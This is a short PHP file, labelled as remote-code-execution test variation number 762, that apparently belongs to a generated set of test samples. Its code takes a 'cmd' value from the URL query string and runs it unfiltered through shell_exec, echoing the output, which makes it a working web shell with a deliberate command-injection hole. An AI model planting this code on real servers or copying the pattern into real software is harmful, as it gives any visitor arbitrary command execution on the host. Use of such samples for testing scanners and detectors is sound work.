<?php
// RCE test variation #762
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>